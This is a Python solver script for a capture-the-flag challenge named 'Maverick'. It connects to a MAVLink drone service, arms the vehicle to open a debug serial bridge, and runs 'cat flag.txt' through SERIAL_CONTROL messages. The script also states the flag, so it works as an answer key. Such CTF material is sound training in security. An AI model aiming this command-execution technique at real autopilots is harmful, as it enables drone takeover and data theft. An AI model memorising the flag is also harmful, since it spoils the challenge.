#!/usr/bin/env python3
"""
CTF Challenge: Maverick
Flag: SK-CERT{d3bu6_my_fly1ng_m4ch1n3}

Solution: Connect to the MAVLink service, arm the vehicle to enable
the debug serial bridge, then use SERIAL_CONTROL to read flag.txt.
"""

import sys
import time
from pymavlink import mavutil

HOST = "exp.cybergame.sk"
PORT = 7030


def arm_vehicle(master):
    """Send MAV_CMD_COMPONENT_ARM_DISARM to arm the drone."""
    master.mav.command_long_send(
        master.target_system,
        master.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0,    # confirmation
        1.0,  # param1: 1 = arm
        0.0,  # param2
        0.0,  # param3
        0.0,  # param4
        0.0,  # param5
        0.0,  # param6
        0.0,  # param7
    )


def send_serial(master, cmd):
    """Send a command through SERIAL_CONTROL to the debug shell."""
    payload = cmd.encode() + b"\n"
    data = list(payload) + [0] * (70 - len(payload))
    master.mav.serial_control_send(
        device=0,
        flags=3,       # MAV_SERIAL_CONTROL_RESPOND | MAV_SERIAL_CONTROL_EXCLUSIVE
        timeout=1000,
        baudrate=115200,
        count=len(payload),
        data=data,
    )


def recv_serial(master, timeout=3.0):
    """Read all SERIAL_CONTROL responses from the debug shell."""
    chunks = []
    deadline = time.time() + timeout
    while time.time() < deadline:
        msg = master.recv_match(blocking=True, timeout=0.5)
        if msg and msg.get_type() == "SERIAL_CONTROL" and msg.count > 0:
            chunk = bytes(msg.data[: msg.count])
            text = chunk.decode("utf-8", errors="replace")
            chunks.append(text)
    return "".join(chunks)


def drain(master, count=30, timeout=1):
    """Discard pending messages (telemetry noise)."""
    for _ in range(count):
        master.recv_match(blocking=True, timeout=timeout)


def main():
    print(f"[*] Connecting to {HOST}:{PORT} over TCP...")
    master = mavutil.mavlink_connection(f"tcp:{HOST}:{PORT}")

    print("[*] Waiting for heartbeat...")
    master.wait_heartbeat(timeout=10)
    print(f"[+] Connected to system {master.target_system}, "
          f"component {master.target_component}")

    print("[*] Arming vehicle to enable debug serial bridge...")
    arm_vehicle(master)
    time.sleep(1)
    drain(master)

    # Drain leftover serial prompt text
    send_serial(master, "")
    recv_serial(master, timeout=1)

    print("[*] Requesting flag.txt...")
    send_serial(master, "cat flag.txt")
    output = recv_serial(master, timeout=3)

    for line in output.splitlines():
        stripped = line.strip()
        if stripped.startswith("SK-CERT"):
            print(f"\n[+] FLAG: {stripped}")
            break
    else:
        print(f"[!] Flag not found in output:\n{output}")
        sys.exit(1)

    master.close()


if __name__ == "__main__":
    main()
